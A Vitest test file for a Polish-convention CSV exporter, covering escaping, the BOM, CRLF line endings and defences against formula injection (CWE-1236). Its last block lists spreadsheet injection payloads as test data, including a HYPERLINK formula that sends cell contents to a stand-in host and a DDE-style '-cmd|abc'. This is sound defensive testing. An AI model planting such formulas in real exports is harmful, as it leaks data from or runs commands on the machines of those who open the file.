// Testy eksportu CSV w polskiej konwencji (lib/csv.ts).

import { describe, expect, it } from "vitest";
import { csvEscape, toCsv } from "@/lib/csv";

describe("csvEscape", () => {
  it("zwykła wartość bez zmian", () => {
    expect(csvEscape("abc")).toBe("abc");
    expect(csvEscape("12 345,67")).toBe("12 345,67");
  });

  it("wartość ze średnikiem → w cudzysłowach", () => {
    expect(csvEscape("a;b")).toBe('"a;b"');
  });

  it("wartość z cudzysłowem → podwojony cudzysłów i całość w cudzysłowach", () => {
    expect(csvEscape('powiedział "cześć"')).toBe('"powiedział ""cześć"""');
  });

  it("wartość z enterem → w cudzysłowach", () => {
    expect(csvEscape("linia1\nlinia2")).toBe('"linia1\nlinia2"');
    expect(csvEscape("linia1\r\nlinia2")).toBe('"linia1\r\nlinia2"');
  });
});

describe("toCsv", () => {
  it("zaczyna się od BOM UTF-8", () => {
    const csv = toCsv(["a"], []);
    expect(csv.charCodeAt(0)).toBe(0xfeff);
    expect(csv.startsWith("﻿")).toBe(true);
  });

  it("średnik jako separator, CRLF między wierszami, CRLF na końcu", () => {
    const csv = toCsv(
      ["Klient", "Kwota"],
      [
        ["Alfa", "100,00"],
        ["Beta", "200,50"],
      ]
    );
    expect(csv).toBe("﻿Klient;Kwota\r\nAlfa;100,00\r\nBeta;200,50\r\n");
  });

  it("escapuje wartości ze średnikiem, cudzysłowem i enterem", () => {
    const csv = toCsv(
      ["Nazwa", "Uwagi"],
      [
        ["Alfa;Beta", 'cytat "x"'],
        ["Gamma", "dwie\nlinie"],
      ]
    );
    expect(csv).toBe(
      '﻿Nazwa;Uwagi\r\n"Alfa;Beta";"cytat ""x"""\r\nGamma;"dwie\nlinie"\r\n'
    );
  });

  it("same nagłówki (brak wierszy) → jedna linia z CRLF", () => {
    expect(toCsv(["a", "b"], [])).toBe("﻿a;b\r\n");
  });
});

describe("csvEscape — neutralizacja formula injection (CWE-1236)", () => {
  it("wartości zaczynające się od =, +, @, tab są neutralizowane apostrofem i cytowane", () => {
    expect(csvEscape("=SUM(A1:A9)")).toBe('"\'=SUM(A1:A9)"');
    expect(csvEscape("@cmd")).toBe('"\'@cmd"');
    expect(csvEscape("+ROUND(1;2)")).toBe('"\'+ROUND(1;2)"');
    expect(csvEscape("\t=1+1")).toBe('"\'\t=1+1"');
  });
  it("payload z cudzysłowami jest neutralizowany i poprawnie escapowany", () => {
    expect(csvEscape('=HYPERLINK("http://x/?"&A1;"raport")')).toBe(
      '"\'=HYPERLINK(""http://x/?""&A1;""raport"")"'
    );
  });
  it("ujemne kwoty i numery telefonów pozostają nietknięte", () => {
    expect(csvEscape("-1 234,56")).toBe("-1 234,56");
    expect(csvEscape("-52420")).toBe("-52420");
    expect(csvEscape("+48 601 234 567")).toBe("+48 601 234 567");
  });
  it("minus przed tekstem (potencjalna formuła) jest neutralizowany", () => {
    expect(csvEscape("-cmd|abc")).toBe('"\'-cmd|abc"');
  });
});
